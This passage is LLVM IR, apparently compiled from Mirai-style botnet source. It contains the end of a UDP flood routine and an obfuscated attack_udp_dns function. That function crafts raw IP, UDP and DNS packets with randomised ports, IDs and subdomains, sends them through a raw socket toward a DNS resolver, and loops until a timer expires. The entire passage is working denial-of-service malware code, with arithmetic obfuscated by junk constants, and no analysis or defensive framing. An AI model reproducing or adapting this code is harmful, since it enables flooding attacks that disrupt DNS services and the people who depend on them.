  %272 = load i16, i16* %18, align 2
  %273 = zext i16 %272 to i32
  %274 = icmp eq i32 %273, 65535
  br i1 %274, label %275, label %280

; <label>:275:                                    ; preds = %271
  %276 = call i32 @rand_next()
  %277 = trunc i32 %276 to i16
  %278 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %279 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %278, i32 0, i32 0
  store i16 %277, i16* %279, align 2
  br label %280

; <label>:280:                                    ; preds = %275, %271
  %281 = load i16, i16* %19, align 2
  %282 = zext i16 %281 to i32
  %283 = icmp eq i32 %282, 65535
  br i1 %283, label %284, label %289

; <label>:284:                                    ; preds = %280
  %285 = call i32 @rand_next()
  %286 = trunc i32 %285 to i16
  %287 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %288 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %287, i32 0, i32 1
  store i16 %286, i16* %288, align 2
  br label %289

; <label>:289:                                    ; preds = %284, %280
  %290 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 7
  store i16 0, i16* %291, align 2
  %292 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %293 = bitcast %struct.iphdr* %292 to i16*
  %294 = call zeroext i16 @checksum_generic(i16* %293, i32 20)
  %295 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 7
  store i16 %294, i16* %296, align 2
  %297 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %298 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %297, i32 0, i32 3
  store i16 0, i16* %298, align 2
  %299 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %300 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %301 = bitcast %struct.udphdr* %300 to i8*
  %302 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 2
  %304 = load i16, i16* %303, align 2
  %305 = load i32, i32* %21, align 4
  %306 = sext i32 %305 to i64
  %307 = sub i64 0, %306
  %308 = sub i64 12, %307
  %309 = add i64 12, %306
  %310 = trunc i64 %308 to i32
  %311 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %299, i8* %301, i16 zeroext %304, i32 %310)
  %312 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 3
  store i16 %311, i16* %313, align 2
  %314 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 1
  %316 = load i16, i16* %315, align 2
  %317 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %318 = load i32, i32* %11, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 0
  %322 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %321, i32 0, i32 1
  store i16 %316, i16* %322, align 2
  %323 = load i32, i32* %12, align 4
  %324 = load i8*, i8** %26, align 8
  %325 = load i32, i32* %21, align 4
  %326 = sext i32 %325 to i64
  %327 = sub i64 32, 1487298743698672938
  %328 = add i64 %327, %326
  %329 = add i64 %328, 1487298743698672938
  %330 = add i64 32, %326
  %331 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %332 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %333 = load i32, i32* %11, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i64 %334
  %336 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %335, i32 0, i32 0
  %337 = bitcast %struct.sockaddr_in* %336 to %struct.sockaddr*
  store %struct.sockaddr* %337, %struct.sockaddr** %331, align 8
  %338 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %339 = load %struct.sockaddr*, %struct.sockaddr** %338, align 8
  %340 = call i64 @sendto(i32 %323, i8* %324, i64 %329, i32 16384, %struct.sockaddr* %339, i32 16)
  br label %341

; <label>:341:                                    ; preds = %289
  %342 = load i32, i32* %11, align 4
  %343 = sub i32 0, %342
  %344 = sub i32 0, 1
  %345 = add i32 %343, %344
  %346 = sub i32 0, %345
  %347 = add nsw i32 %342, 1
  store i32 %346, i32* %11, align 4
  br label %214

; <label>:348:                                    ; preds = %214
  %349 = call i64 @time(i64* null) #6
  %350 = load i32, i32* %22, align 4
  %351 = sext i32 %350 to i64
  %352 = icmp sgt i64 %349, %351
  br i1 %352, label %353, label %354

; <label>:353:                                    ; preds = %348
  br label %355

; <label>:354:                                    ; preds = %348
  br label %213

; <label>:355:                                    ; preds = %353, %76, %70
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = add i64 %81, 6505272398606940460
  %85 = add i64 %84, %83
  %86 = sub i64 %85, 6505272398606940460
  %87 = add nsw i64 %81, %83
  %88 = trunc i64 %86 to i32
  store i32 %88, i32* %25, align 4
  %89 = load i8*, i8** %22, align 8
  %90 = icmp eq i8* %89, null
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %5
  br label %540

; <label>:92:                                     ; preds = %5
  %93 = load i8*, i8** %22, align 8
  %94 = call i32 @util_strlen(i8* %93)
  store i32 %94, i32* %23, align 4
  %95 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %95, i32* %12, align 4
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %92
  br label %540

; <label>:98:                                     ; preds = %92
  store i32 1, i32* %11, align 4
  %99 = load i32, i32* %12, align 4
  %100 = bitcast i32* %11 to i8*
  %101 = call i32 @setsockopt(i32 %99, i32 0, i32 3, i8* %100, i32 4) #6
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %98
  %104 = load i32, i32* %12, align 4
  %105 = call i32 @close(i32 %104)
  br label %540

; <label>:106:                                    ; preds = %98
  store i32 0, i32* %11, align 4
  br label %107

; <label>:107:                                    ; preds = %348, %106
  %108 = load i32, i32* %11, align 4
  %109 = load i8, i8* %7, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp slt i32 %108, %110
  br i1 %111, label %112, label %354

; <label>:112:                                    ; preds = %107
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %113 = call noalias i8* @calloc(i64 600, i64 1) #6
  %114 = load i8**, i8*** %13, align 8
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8*, i8** %114, i64 %116
  store i8* %113, i8** %117, align 8
  %118 = load i8**, i8*** %13, align 8
  %119 = load i32, i32* %11, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to %struct.iphdr*
  store %struct.iphdr* %123, %struct.iphdr** %29, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i64 1
  %126 = bitcast %struct.iphdr* %125 to %struct.udphdr*
  store %struct.udphdr* %126, %struct.udphdr** %30, align 8
  %127 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i64 1
  %129 = bitcast %struct.udphdr* %128 to %struct.dnshdr*
  store %struct.dnshdr* %129, %struct.dnshdr** %31, align 8
  %130 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %131 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %130, i64 1
  %132 = bitcast %struct.dnshdr* %131 to i8*
  store i8* %132, i8** %32, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %134 = bitcast %struct.iphdr* %133 to i8*
  %135 = load i8, i8* %134, align 4
  %136 = xor i8 %135, -1
  %137 = xor i8 15, -1
  %138 = xor i8 9, -1
  %139 = or i8 %136, %137
  %140 = or i8 9, %138
  %141 = xor i8 %139, -1
  %142 = and i8 %141, %140
  %143 = and i8 %135, 15
  %144 = xor i8 %142, -1
  %145 = xor i8 64, -1
  %146 = xor i8 64, -1
  %147 = and i8 %144, 64
  %148 = and i8 %142, %146
  %149 = and i8 %145, 64
  %150 = and i8 64, %146
  %151 = or i8 %147, %148
  %152 = or i8 %149, %150
  %153 = xor i8 %151, %152
  %154 = or i8 %144, %145
  %155 = xor i8 %154, -1
  %156 = or i8 64, %146
  %157 = and i8 %155, %156
  %158 = or i8 %153, %157
  %159 = or i8 %142, 64
  store i8 %158, i8* %134, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %161 = bitcast %struct.iphdr* %160 to i8*
  %162 = load i8, i8* %161, align 4
  %163 = xor i8 %162, -1
  %164 = xor i8 -16, -1
  %165 = xor i8 -118, -1
  %166 = or i8 %163, %164
  %167 = or i8 -118, %165
  %168 = xor i8 %166, -1
  %169 = and i8 %168, %167
  %170 = and i8 %162, -16
  %171 = xor i8 %169, -1
  %172 = xor i8 5, -1
  %173 = xor i8 -93, -1
  %174 = and i8 %171, -93
  %175 = and i8 %169, %173
  %176 = and i8 %172, -93
  %177 = and i8 5, %173
  %178 = or i8 %174, %175
  %179 = or i8 %176, %177
  %180 = xor i8 %178, %179
  %181 = or i8 %171, %172
  %182 = xor i8 %181, -1
  %183 = or i8 -93, %173
  %184 = and i8 %182, %183
  %185 = or i8 %180, %184
  %186 = or i8 %169, 5
  store i8 %185, i8* %161, align 4
  %187 = load i8, i8* %14, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 1
  store i8 %187, i8* %189, align 1
  %190 = load i8, i8* %21, align 1
  %191 = zext i8 %190 to i64
  %192 = sub i64 0, 41
  %193 = sub i64 0, %191
  %194 = add i64 %192, %193
  %195 = sub i64 0, %194
  %196 = add i64 41, %191
  %197 = sub i64 0, %195
  %198 = sub i64 0, 2
  %199 = add i64 %197, %198
  %200 = sub i64 0, %199
  %201 = add i64 %195, 2
  %202 = load i32, i32* %23, align 4
  %203 = sext i32 %202 to i64
  %204 = add i64 %200, -2219410272060192420
  %205 = add i64 %204, %203
  %206 = sub i64 %205, -2219410272060192420
  %207 = add i64 %200, %203
  %208 = sub i64 %206, 8678585002902281279
  %209 = add i64 %208, 4
  %210 = add i64 %209, 8678585002902281279
  %211 = add i64 %206, 4
  %212 = trunc i64 %210 to i16
  %213 = call zeroext i16 @htons(i16 zeroext %212) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 2
  store i16 %213, i16* %215, align 2
  %216 = load i16, i16* %15, align 2
  %217 = call zeroext i16 @htons(i16 zeroext %216) #7
  %218 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 3
  store i16 %217, i16* %219, align 4
  %220 = load i8, i8* %16, align 1
  %221 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %222 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %221, i32 0, i32 5
  store i8 %220, i8* %222, align 4
  %223 = load i8, i8* %17, align 1
  %224 = icmp ne i8 %223, 0
  br i1 %224, label %225, label %229

; <label>:225:                                    ; preds = %112
  %226 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %227 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i32 0, i32 4
  store i16 %226, i16* %228, align 2
  br label %229

; <label>:229:                                    ; preds = %225, %112
  %230 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 6
  store i8 17, i8* %231, align 1
  %232 = load i32, i32* @LOCAL_ADDR, align 4
  %233 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 8
  store i32 %232, i32* %234, align 4
  %235 = load i32, i32* %24, align 4
  %236 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 9
  store i32 %235, i32* %237, align 4
  %238 = load i16, i16* %18, align 2
  %239 = call zeroext i16 @htons(i16 zeroext %238) #7
  %240 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %241 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %240, i32 0, i32 0
  store i16 %239, i16* %241, align 2
  %242 = load i16, i16* %19, align 2
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %245 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  %246 = load i8, i8* %21, align 1
  %247 = zext i8 %246 to i64
  %248 = sub i64 21, 619171466728026440
  %249 = add i64 %248, %247
  %250 = add i64 %249, 619171466728026440
  %251 = add i64 21, %247
  %252 = sub i64 0, 2
  %253 = sub i64 %250, %252
  %254 = add i64 %250, 2
  %255 = load i32, i32* %23, align 4
  %256 = sext i32 %255 to i64
  %257 = sub i64 0, %253
  %258 = sub i64 0, %256
  %259 = add i64 %257, %258
  %260 = sub i64 0, %259
  %261 = add i64 %253, %256
  %262 = sub i64 0, 4
  %263 = sub i64 %260, %262
  %264 = add i64 %260, 4
  %265 = trunc i64 %263 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #7
  %267 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 2
  store i16 %266, i16* %268, align 2
  %269 = load i16, i16* %20, align 2
  %270 = call zeroext i16 @htons(i16 zeroext %269) #7
  %271 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %272 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %271, i32 0, i32 0
  store i16 %270, i16* %272, align 2
  %273 = call zeroext i16 @htons(i16 zeroext 256) #7
  %274 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %275 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %274, i32 0, i32 1
  store i16 %273, i16* %275, align 2
  %276 = call zeroext i16 @htons(i16 zeroext 1) #7
  %277 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %278 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %277, i32 0, i32 2
  store i16 %276, i16* %278, align 2
  %279 = load i8, i8* %21, align 1
  %280 = load i8*, i8** %32, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %32, align 8
  store i8 %279, i8* %280, align 1
  %282 = load i8, i8* %21, align 1
  %283 = zext i8 %282 to i32
  %284 = load i8*, i8** %32, align 8
  %285 = sext i32 %283 to i64
  %286 = getelementptr inbounds i8, i8* %284, i64 %285
  store i8* %286, i8** %32, align 8
  %287 = load i8*, i8** %32, align 8
  store i8* %287, i8** %33, align 8
  %288 = load i8*, i8** %32, align 8
  %289 = getelementptr inbounds i8, i8* %288, i64 1
  %290 = load i8*, i8** %22, align 8
  %291 = load i32, i32* %23, align 4
  %292 = add i32 %291, 378354260
  %293 = add i32 %292, 1
  %294 = sub i32 %293, 378354260
  %295 = add nsw i32 %291, 1
  call void @util_memcpy(i8* %289, i8* %290, i32 %294)
  store i32 0, i32* %26, align 4
  br label %296

; <label>:296:                                    ; preds = %327, %229
  %297 = load i32, i32* %26, align 4
  %298 = load i32, i32* %23, align 4
  %299 = icmp slt i32 %297, %298
  br i1 %299, label %300, label %333

; <label>:300:                                    ; preds = %296
  %301 = load i8*, i8** %22, align 8
  %302 = load i32, i32* %26, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8, i8* %301, i64 %303
  %305 = load i8, i8* %304, align 1
  %306 = sext i8 %305 to i32
  %307 = icmp eq i32 %306, 46
  br i1 %307, label %308, label %320

; <label>:308:                                    ; preds = %300
  %309 = load i8, i8* %27, align 1
  %310 = load i8*, i8** %33, align 8
  store i8 %309, i8* %310, align 1
  store i8 0, i8* %27, align 1
  %311 = load i8, i8* %28, align 1
  %312 = sub i8 0, 1
  %313 = sub i8 %311, %312
  %314 = add i8 %311, 1
  store i8 %313, i8* %28, align 1
  %315 = load i8*, i8** %32, align 8
  %316 = load i32, i32* %26, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds i8, i8* %315, i64 %317
  %319 = getelementptr inbounds i8, i8* %318, i64 1
  store i8* %319, i8** %33, align 8
  br label %326

; <label>:320:                                    ; preds = %300
  %321 = load i8, i8* %27, align 1
  %322 = sub i8 %321, -60
  %323 = add i8 %322, 1
  %324 = add i8 %323, -60
  %325 = add i8 %321, 1
  store i8 %324, i8* %27, align 1
  br label %326

; <label>:326:                                    ; preds = %320, %308
  br label %327

; <label>:327:                                    ; preds = %326
  %328 = load i32, i32* %26, align 4
  %329 = add i32 %328, 1244264859
  %330 = add i32 %329, 1
  %331 = sub i32 %330, 1244264859
  %332 = add nsw i32 %328, 1
  store i32 %331, i32* %26, align 4
  br label %296

; <label>:333:                                    ; preds = %296
  %334 = load i8, i8* %27, align 1
  %335 = load i8*, i8** %33, align 8
  store i8 %334, i8* %335, align 1
  %336 = load i8*, i8** %32, align 8
  %337 = load i32, i32* %23, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds i8, i8* %336, i64 %338
  %340 = getelementptr inbounds i8, i8* %339, i64 2
  %341 = bitcast i8* %340 to %struct.grehdr*
  store %struct.grehdr* %341, %struct.grehdr** %34, align 8
  %342 = call zeroext i16 @htons(i16 zeroext 1) #7
  %343 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %344 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %343, i32 0, i32 0
  store i16 %342, i16* %344, align 2
  %345 = call zeroext i16 @htons(i16 zeroext 1) #7
  %346 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %347 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %346, i32 0, i32 1
  store i16 %345, i16* %347, align 2
  br label %348

; <label>:348:                                    ; preds = %333
  %349 = load i32, i32* %11, align 4
  %350 = sub i32 %349, 383463191
  %351 = add i32 %350, 1
  %352 = add i32 %351, 383463191
  %353 = add nsw i32 %349, 1
  store i32 %352, i32* %11, align 4
  br label %107

; <label>:354:                                    ; preds = %107
  br label %355

; <label>:355:                                    ; preds = %539, %354
  store i32 0, i32* %11, align 4
  br label %356

; <label>:356:                                    ; preds = %527, %355
  %357 = load i32, i32* %11, align 4
  %358 = load i8, i8* %7, align 1
  %359 = zext i8 %358 to i32
  %360 = icmp slt i32 %357, %359
  br i1 %360, label %361, label %533

; <label>:361:                                    ; preds = %356
  %362 = load i8**, i8*** %13, align 8
  %363 = load i32, i32* %11, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds i8*, i8** %362, i64 %364
  %366 = load i8*, i8** %365, align 8
  store i8* %366, i8** %35, align 8
  %367 = load i8*, i8** %35, align 8
  %368 = bitcast i8* %367 to %struct.iphdr*
  store %struct.iphdr* %368, %struct.iphdr** %36, align 8
  %369 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %370 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %369, i64 1
  %371 = bitcast %struct.iphdr* %370 to %struct.udphdr*
  store %struct.udphdr* %371, %struct.udphdr** %37, align 8
  %372 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %373 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %372, i64 1
  %374 = bitcast %struct.udphdr* %373 to %struct.dnshdr*
  store %struct.dnshdr* %374, %struct.dnshdr** %38, align 8
  %375 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %376 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %375, i64 1
  %377 = bitcast %struct.dnshdr* %376 to i8*
  %378 = getelementptr inbounds i8, i8* %377, i64 1
  store i8* %378, i8** %39, align 8
  %379 = load i16, i16* %15, align 2
  %380 = zext i16 %379 to i32
  %381 = icmp eq i32 %380, 65535
  br i1 %381, label %382, label %395

; <label>:382:                                    ; preds = %361
  %383 = call i32 @rand_next()
  %384 = xor i32 %383, -1
  %385 = xor i32 65535, -1
  %386 = xor i32 1072494704, -1
  %387 = or i32 %384, %385
  %388 = or i32 1072494704, %386
  %389 = xor i32 %387, -1
  %390 = and i32 %389, %388
  %391 = and i32 %383, 65535
  %392 = trunc i32 %390 to i16
  %393 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 3
  store i16 %392, i16* %394, align 4
  br label %395

; <label>:395:                                    ; preds = %382, %361
  %396 = load i16, i16* %18, align 2
  %397 = zext i16 %396 to i32
  %398 = icmp eq i32 %397, 65535
  br i1 %398, label %399, label %408

; <label>:399:                                    ; preds = %395
  %400 = call i32 @rand_next()
  %401 = xor i32 65535, -1
  %402 = xor i32 %400, %401
  %403 = and i32 %402, %400
  %404 = and i32 %400, 65535
  %405 = trunc i32 %403 to i16
  %406 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %407 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %406, i32 0, i32 0
  store i16 %405, i16* %407, align 2
  br label %408

; <label>:408:                                    ; preds = %399, %395
  %409 = load i16, i16* %19, align 2
  %410 = zext i16 %409 to i32
  %411 = icmp eq i32 %410, 65535
  br i1 %411, label %412, label %421

; <label>:412:                                    ; preds = %408
  %413 = call i32 @rand_next()
  %414 = xor i32 65535, -1
  %415 = xor i32 %413, %414
  %416 = and i32 %415, %413
  %417 = and i32 %413, 65535
  %418 = trunc i32 %416 to i16
  %419 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %420 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %419, i32 0, i32 1
  store i16 %418, i16* %420, align 2
  br label %421

; <label>:421:                                    ; preds = %412, %408
  %422 = load i16, i16* %20, align 2
  %423 = zext i16 %422 to i32
  %424 = icmp eq i32 %423, 65535
  br i1 %424, label %425, label %434

; <label>:425:                                    ; preds = %421
  %426 = call i32 @rand_next()
  %427 = xor i32 65535, -1
  %428 = xor i32 %426, %427
  %429 = and i32 %428, %426
  %430 = and i32 %426, 65535
  %431 = trunc i32 %429 to i16
  %432 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %433 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %432, i32 0, i32 0
  store i16 %431, i16* %433, align 2
  br label %434

; <label>:434:                                    ; preds = %425, %421
  %435 = load i8*, i8** %39, align 8
  %436 = load i8, i8* %21, align 1
  %437 = zext i8 %436 to i32
  call void @rand_alphastr(i8* %435, i32 %437)
  %438 = load i8*, i8** %39, align 8
  %439 = load i8, i8* %21, align 1
  %440 = zext i8 %439 to i64
  %441 = getelementptr inbounds i8, i8* %438, i64 %440
  store i8 0, i8* %441, align 1
  %442 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 7
  store i16 0, i16* %443, align 2
  %444 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %445 = bitcast %struct.iphdr* %444 to i16*
  %446 = call zeroext i16 @checksum_generic(i16* %445, i32 20)
  %447 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 7
  store i16 %446, i16* %448, align 2
  %449 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %450 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %449, i32 0, i32 3
  store i16 0, i16* %450, align 2
  %451 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %452 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %453 = bitcast %struct.udphdr* %452 to i8*
  %454 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %455 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %454, i32 0, i32 2
  %456 = load i16, i16* %455, align 2
  %457 = load i8, i8* %21, align 1
  %458 = zext i8 %457 to i64
  %459 = sub i64 21, 4040682785768313945
  %460 = add i64 %459, %458
  %461 = add i64 %460, 4040682785768313945
  %462 = add i64 21, %458
  %463 = sub i64 0, 2
  %464 = sub i64 %461, %463
  %465 = add i64 %461, 2
  %466 = load i32, i32* %23, align 4
  %467 = sext i32 %466 to i64
  %468 = add i64 %464, 3020778440392575521
  %469 = add i64 %468, %467
  %470 = sub i64 %469, 3020778440392575521
  %471 = add i64 %464, %467
  %472 = add i64 %470, 2115762326117657995
